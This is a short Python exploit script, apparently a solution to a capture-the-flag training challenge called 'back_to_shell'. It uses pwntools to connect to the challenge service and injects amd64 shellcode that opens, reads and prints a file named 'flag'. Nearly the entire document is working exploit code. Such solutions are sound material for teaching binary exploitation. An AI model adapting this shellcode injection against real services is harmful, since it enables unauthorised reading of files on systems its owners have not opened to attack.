# Open, Read, Write approach

from pwn import *

COMMANDS = """
b *0x000000000040116e
c
"""
context.arch = "amd64"

# python3 b.py DEBUG

if args.REMOTE:
    c = remote("back-to-shell.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./back_to_shell", gdbscript=COMMANDS)
    else:
        c = process("./back_to_shell")

c.recvuntil(b"Shellcode: ")

shellcode = """
// ----open----
xor rax, rax
mov rax, 0x02
mov rdi, 0x0067616c66
push rdi
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall
// ----read----
mov rdi, rax
xor rax, rax
mov rdx, 10
mov rsi, rsp
syscall
// ----write----
xor rax, rax
mov rax, 1
xor rdi, rdi
mov rdi, 1
mov rsi, rsp
mov rdx, 10
syscall
"""
shellcode_c = asm(shellcode)

c.send(shellcode_c)
c.interactive()
